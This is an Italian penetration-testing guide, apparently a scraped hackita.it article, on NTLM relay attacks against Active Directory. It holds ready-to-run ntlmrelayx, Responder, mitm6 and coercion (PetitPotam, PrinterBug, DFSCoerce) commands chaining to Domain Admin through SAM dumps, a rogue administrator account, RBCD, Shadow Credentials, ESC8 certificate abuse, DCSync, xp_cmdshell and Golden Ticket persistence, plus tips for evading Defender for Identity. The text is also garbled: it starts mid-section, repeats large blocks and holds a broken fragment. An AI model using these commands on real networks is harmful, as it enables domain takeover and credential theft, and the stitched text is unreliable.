```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
'EvilPass123!'

# RBCD automatico — --delegate-access crea computer + configura delega

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --delegate-access

# Shadow Credentials — inietta chiave in msDS-KeyCredentialLink

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support \
\--shadow-credentials --shadow-target 'WS01

***

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```
LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS
```

| Cosa puoi fare              | Requisito                        |
| --------------------------- | -------------------------------- |
| Tutto ciò che LDAP permette | +                                |
| Shadow Credentials          | Write su msDS-KeyCredentialLink  |
| Add computer account        | MachineAccountQuota > 0          |
| RBCD completo               | Write sul computer object target |

***

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```
HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato
```

| Target HTTP                        | Vettore                             |
| ---------------------------------- | ----------------------------------- |
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS                       | Accesso mailbox, lateral movement   |
| OWA (Outlook Web App)              | Accesso email                       |
| IIS con NTLM auth                  | Accesso app                         |
| WPAD                               | Cattura hash durante browsing       |

***

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```
MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp_cmdshell → RCE
```

| Cosa puoi fare      | Requisito                 |
| ------------------- | ------------------------- |
| Login al database   | Windows Auth abilitata    |
| Query dati          | Permessi SELECT           |
| `xp_cmdshell` → RCE | sysadmin role             |
| Lettura file server | `BULK INSERT`, OPENROWSET |

***

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```
IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo
```

***

## Decision tree — cosa usi in base a cosa trovi

```
HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap://DC_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps://DC_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp_cmdshell
│           → ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
    └── mitm6 → LDAPS relay → RBCD → getST → DA
```

***

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
```

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
